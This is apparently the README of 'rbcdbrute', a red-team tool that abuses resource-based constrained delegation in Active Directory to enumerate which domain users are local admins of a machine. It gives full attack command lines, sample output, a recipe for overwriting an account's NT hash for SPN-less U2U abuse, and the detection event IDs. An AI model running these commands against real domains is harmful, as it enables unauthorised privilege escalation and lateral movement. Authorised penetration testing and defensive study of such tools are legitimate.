# rbcdbrute

You control an account with RBCD rights over a machine. **Which domain users are
local admins of it?** `rbcdbrute` answers that, fast.

For each user it does S4U2Self + S4U2Proxy, then tries an `ADMIN$` tree connect
with the resulting ticket. `ADMIN$` is admin-only, so a successful connect means
local admin. Pure impacket: no `smbclient`, no external binary, no ticket on disk.

## Why

I did this with a `for` loop around NetExec, one impersonation per iteration. On
a thousand-user domain it was painfully slow, because every call re-negotiated
from scratch. `rbcdbrute` gets the TGT **once** and reuses it across a thread
pool: minutes become seconds (1007 users in ~13s).

## Prerequisites

RBCD must already be set up; this tool exploits it, it does not configure it.
Your account's SID must be in the target's
`msDS-AllowedToActOnBehalfOfOtherIdentity`. You need reach to the KDC (88/tcp)
and the target (445/tcp).

## Install

```bash
git clone https://github.com/nnnnino/rbcdbrute.git
cd rbcdbrute
python3 -m venv venv && source venv/bin/activate
pip install impacket tqdm
```

## Usage

```
rbcdbrute.py [options] domain.local/username[:password]
```

The positional arg is **your** account (the one RBCD is delegated *from*).
`-target` is the machine to enumerate, given as a **machine account name**
(`WK01$`), not an FQDN.

```bash
# NT hash
python3 rbcdbrute.py 'red.local/ATTACKER$' -hashes ':C7A9...EEEA' \
  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10

# password (prompted if omitted)
python3 rbcdbrute.py 'red.local/ATTACKER$':'ATTACKER' -target 'WK01$' -users users.txt -dc-ip 10.10.100.10

# existing ccache
KRB5CCNAME=attacker.ccache python3 rbcdbrute.py 'red.local/ATTACKER$' -k -no-pass \
  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
```

`-aesKey <hex>` also works. The FQDN is built from the realm for the SPN and
resolved via DNS unless you pass `-target-ip`.

### Example

```bash
python3 rbcdbrute.py 'red.local'/'ATTACKER$':'ATTACKER' -target 'WK01$' -users users.txt -dc-ip 10.10.100.10

[*] Authentication
    account   ATTACKER$@RED.LOCAL
    method    password -> AS-REQ
    KDC       10.10.100.10
    TGT       OK

[*] Target
    host      WK01.red.local (10.10.100.11:445)
    SPN       cifs/WK01.red.local
    check     S4U2Self + S4U2Proxy, then ADMIN$ tree connect
    SPN check OK

[*] Run
    users     1007
    threads   20
    timeout   10s  (SMB)
    output    stdout only (-o FILE to save)

[+] ADMIN    nnino
[+] ADMIN    Administrator

-------------------------- Summary --------------------------
       2  admins    local administrators of the target
      72  no ticket not delegatable, disabled, locked out or expired
       3  unknown   no such principal in the realm
       0  errors    unexpected failures
    1007  checked   out of 1007 in 12.8s  (79 users/s)

  no ticket breakdown:
       40x  KDC_ERR_BADOPTION
       32x  KDC_ERR_CLIENT_REVOKED

  (-v lists them live, -errors-file FILE writes them out)

  Local admins (-o FILE to save them)
    + nnino
    + Administrator
```

## SPN-less controlled account (`-u2u`)

If the account you control has no SPN, plain S4U2Self can't get you a usable
ticket. The workaround is U2U: request the S4U2Self ticket sealed in your own
TGT session key (`enc-tkt-in-skey`), after setting the account's NT hash to that
same session key so the KDC can decrypt it again at S4U2Proxy.

Do the one-time prep out of band (see
[the hacker recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users)):

```bash
# TGT, and its session key
getTGT.py -hashes ":$(pypykatz crypto nt "$PASSWORD")" "$DOMAIN/$USER"
describeTicket.py "$USER.ccache" | grep 'Ticket Session Key'

# set the account's NT hash to that session key
changepasswd.py -newhashes :TGTSessionKey "$DOMAIN/$USER:$PASSWORD"@"$DC_HOST"
```

Then point rbcdbrute at that **same** ccache with `-u2u`:

```bash
KRB5CCNAME="$USER.ccache" python3 rbcdbrute.py "$DOMAIN/$USER" -u2u -k -no-pass \
  -target 'WK01$' -users users.txt -dc-ip 10.10.100.10
```

`-u2u` requires the ccache TGT (`-k`): the ticket is sealed with *that* TGT's
session key, so a freshly requested one would not match the NT hash you set and
S4U2Proxy would fail. The tool refuses any other auth path in this mode.

## Detection

Loud. Every user is a `4769` on the DC with the transited-services field set (the
S4U tell); admin hits are `5140` on the target. Run it knowing that.

## Notes

- Only local Administrators membership is probed. Nothing is written or run on the target.
- Tickets stay in memory; use `getST.py` if you want one on disk.
- `-threads` above ~30 tends to give timeouts, not speed.

> Use only against systems you are authorised to test.
